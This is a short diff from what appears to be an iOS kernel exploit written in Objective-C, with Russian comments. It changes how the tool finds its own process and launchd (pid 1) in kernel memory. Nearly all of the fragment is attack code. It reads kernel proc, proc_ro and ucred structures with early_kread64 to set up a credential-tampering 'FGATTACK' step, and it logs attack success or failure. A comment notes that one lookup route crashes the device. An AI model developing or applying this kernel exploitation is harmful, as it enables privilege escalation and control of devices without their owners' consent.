@@ -2303,7 +2303,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     }
     uint64_t selfProc = proc_self();
     if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
-    if (!selfProc) selfProc = [self findProcByPid:(uint32_t)getpid() log:r];
+    // findProcByPid намеренно не используем — его EXP-01 zone-route валит девайс
     if (!selfProc) { [r appendString:@"[RESULT] АТАКА: FAIL — свой proc не найден\n"]; return r; }
     uint64_t procRo = kp_untag_ptr(early_kread64(selfProc + koffsetof(proc, proc_ro)));
     uint64_t curUcred = kpLooksLikeKernelPointer(procRo) ? kp_untag_ptr(early_kread64(procRo + koffsetof(proc_ro, ucred))) : 0;
@@ -2312,7 +2312,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     kpNote(r, @"  [FGATTACK] step2: ucred найден");
     // --- FGATTACK body (kwrite-only, type-gated) ---
             {
-                uint64_t ldProc = [self findProcByPid:1 log:nil];
+                uint64_t ldProc = [self findSelfProcByPidFast:1 log:nil];
                 uint64_t rootZVA = 0;
                 if (kpLooksLikeKernelPointer(ldProc)) {
                     uint64_t ldRo = kp_untag_ptr(early_kread64(ldProc + koffsetof(proc, proc_ro)));
